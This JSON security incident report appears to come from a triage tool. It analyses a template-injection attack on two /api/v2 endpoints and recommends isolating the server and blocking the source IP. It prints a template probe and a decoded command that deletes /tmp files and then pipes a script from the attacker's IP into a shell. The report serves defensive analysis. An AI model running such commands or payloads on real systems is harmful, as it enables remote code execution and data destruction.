{
  "explanation": "The attacker from IP 91.92.240.8 attempted to exploit a template injection vulnerability using a base64-encoded payload (`e3tjb25maWcuX19jbGFzc19ffX0=`, which decodes to `{{config.__class__}}`), followed by an attempt to execute remote code via a curl-to-shell command (`cm0gLXJmIC90bXAvKiAmJiBjdXJsIDkxLjkyLjI0MC44L3ggfCBzaA==` decoding to `rm -rf /tmp/* && curl 91.92.240.8/x | sh`). The HTTP 200 status codes indicate that the server successfully processed the requests, suggesting potential payload execution and severe system compromise.",
  "mitre_tactic": "Execution",
  "recommended_actions": [
    "Immediately isolate the affected server from the network to prevent further malicious activity or lateral movement.",
    "Block the source IP address (91.92.240.8) at the perimeter firewall and review logs for any additional associated IP addresses.",
    "Inspect system integrity, examine processes, and remediate the template injection vulnerability in the `/api/v2/templates/render` and `/api/v2/run` endpoints."
  ]
}
